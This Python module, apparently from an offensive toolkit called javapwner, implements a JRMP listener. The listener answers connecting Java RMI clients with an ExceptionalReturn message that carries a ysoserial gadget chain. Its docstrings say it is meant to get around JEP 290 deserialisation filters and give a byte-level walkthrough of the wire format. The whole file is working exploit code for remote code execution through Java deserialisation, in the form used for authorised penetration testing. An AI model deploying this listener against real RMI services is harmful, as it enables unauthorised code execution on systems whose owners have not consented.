"""JRMP listener — a minimal JRMP server that delivers a payload to
any connecting client.

When a JEP 290-filtered RMI endpoint deserialises a ``UnicastRef`` pointing
back to our listener, the target's RMI runtime connects here.  We respond
with a ``RETURN_VALUE`` message containing the actual ysoserial gadget
chain, which is deserialised *outside* the JEP 290 filter context.

This is the same technique used by ``ysoserial.exploit.JRMPListener``.
"""

from __future__ import annotations

import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from javapwner.protocols.rmi.protocol import (
    JRMP_MAGIC,
    JRMP_VERSION,
    PROTOCOL_ACK,
    MSG_RETURN,
    RETURN_VALUE,
    RETURN_EXCEPTION,
    JAVA_STREAM_MAGIC,
    JAVA_STREAM_VERSION,
)
from javapwner.core.socket_helper import write_java_utf

_DEFAULT_TIMEOUT = 60.0


@dataclass
class JrmpListenerResult:
    """Result of a JRMP listener session."""
    connections: int = 0
    payloads_sent: int = 0
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "connections": self.connections,
            "payloads_sent": self.payloads_sent,
            "errors": self.errors,
        }


class JrmpListener:
    """A minimal JRMP server that serves an exploit payload.

    Parameters
    ----------
    payload:
        Raw serialised Java object to deliver to connecting clients.
    listen_host:
        Address to bind to (default ``"0.0.0.0"``).
    listen_port:
        Port to listen on (default ``8888``).
    timeout:
        Maximum seconds to wait for one connection (default 60).
    max_connections:
        Stop after this many connections (default 1).
    """

    def __init__(
        self,
        payload: bytes,
        listen_host: str = "0.0.0.0",
        listen_port: int = 8888,
        timeout: float = _DEFAULT_TIMEOUT,
        max_connections: int = 1,
    ):
        self.payload = payload
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.timeout = timeout
        self.max_connections = max_connections
        self._server: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._result = JrmpListenerResult()
        self._stop_event = threading.Event()

    @property
    def result(self) -> JrmpListenerResult:
        return self._result

    def start(self) -> None:
        """Start the listener in a background thread."""
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.settimeout(1.0)
        self._server.bind((self.listen_host, self.listen_port))
        self._server.listen(5)

        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the listener."""
        self._stop_event.set()
        if self._server:
            try:
                self._server.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=5.0)

    def wait(self, timeout: float | None = None) -> JrmpListenerResult:
        """Block until the listener finishes or *timeout* expires."""
        if self._thread:
            self._thread.join(timeout=timeout or self.timeout)
        return self._result

    def _serve(self) -> None:
        """Accept connections and deliver the payload."""
        deadline = time.monotonic() + self.timeout
        while not self._stop_event.is_set():
            if self._result.connections >= self.max_connections:
                break
            if time.monotonic() > deadline:
                break
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            self._result.connections += 1
            try:
                self._handle_client(client)
                self._result.payloads_sent += 1
            except Exception as exc:
                self._result.errors.append(f"{addr}: {exc}")
            finally:
                try:
                    client.close()
                except OSError:
                    pass

    def _handle_client(self, sock: socket.socket) -> None:
        """Handle one JRMP client connection.

        Protocol (mirrors ysoserial JRMPListener):
        1. Read JRMP handshake from client (7 bytes: magic + version + protocol)
        2. Send ProtocolAck + host/port
        3. Read client's endpoint info (6 bytes: empty-UTF + zero-port)
        4. Read the incoming CALL message (DGC dirty() call from target)
        5. Send ExceptionalReturn with the exploit payload

        Wire format of ExceptionalReturn (per JRMP spec and ysoserial):
          0x51               MSG_RETURN  (raw byte before ObjectOutputStream)
          AC ED 00 05        ObjectOutputStream header
          77 0F              TC_BLOCKDATA, length=15
            02               RETURN_EXCEPTION type byte
            [4 bytes]        UID.unique  (int32)
            [8 bytes]        UID.time    (int64)
            [2 bytes]        UID.count   (int16)
          [object bytes]     serialised gadget (payload stripped of ACED0005 header)
        """
        sock.settimeout(10.0)

        # 1. Read JRMP handshake
        header = self._recv_exact(sock, 7)
        if header[:4] != JRMP_MAGIC:
            raise ValueError("Not a JRMP client")

        # 2. Send ProtocolAck — version must be 2 (JRMP StreamProtocol)
        ack = (
            bytes([PROTOCOL_ACK])
            + JRMP_VERSION              # b"\x00\x02"
            + write_java_utf(self.listen_host)
            + struct.pack(">I", self.listen_port)
        )
        sock.sendall(ack)

        # 3. Read client's endpoint info (6 bytes: writeUTF("") + writeInt(0))
        try:
            sock.recv(512)
        except socket.timeout:
            pass

        # 4. Read the incoming CALL (DGC dirty() the target sends us).
        #    We consume it but don't parse it — just drain available bytes.
        try:
            sock.recv(4096)
        except socket.timeout:
            pass

        # 5. Send ExceptionalReturn with the exploit payload
        sock.sendall(self._build_exceptional_return())

    def _build_exceptional_return(self) -> bytes:
        """Build a JRMP ExceptionalReturn message containing the exploit payload.

        The payload from ysoserial is a complete ObjectOutputStream (starts with
        AC ED 00 05).  We strip that header and embed the inner object bytes
        directly inside our return ObjectOutputStream, matching the format
        produced by ysoserial.exploit.JRMPListener.

        Note: handle numbering is preserved because TC_BLOCKDATA does not
        allocate handles, so the first TC_OBJECT in the embedded payload still
        gets handle 0x7E0000 — the same as in the standalone ysoserial stream.
        """
        # Strip the OOS header from the payload to get the raw object bytes.
        payload = self.payload
        inner_object = payload[4:] if payload[:4] == b"\xac\xed\x00\x05" else payload

        # UID: unique(int32=0) + time(int64=0) + count(int16=0) = 14 bytes
        uid = struct.pack(">i", 0) + struct.pack(">q", 0) + struct.pack(">h", 0)

        # Blockdata: ExceptionalReturn type byte + UID = 15 bytes total
        blockdata = bytes([RETURN_EXCEPTION]) + uid
        assert len(blockdata) == 15  # sanity check: TC_BLOCKDATA length = 0x0F

        return_stream = (
            JAVA_STREAM_MAGIC                        # AC ED
            + JAVA_STREAM_VERSION                    # 00 05
            + b"\x77" + bytes([len(blockdata)])      # TC_BLOCKDATA, 0x0F
            + blockdata                              # 02 + UID (15 bytes)
            + inner_object                           # TC_OBJECT ... (gadget)
        )

        return bytes([MSG_RETURN]) + return_stream

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes:
        """Receive exactly *n* bytes."""
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data
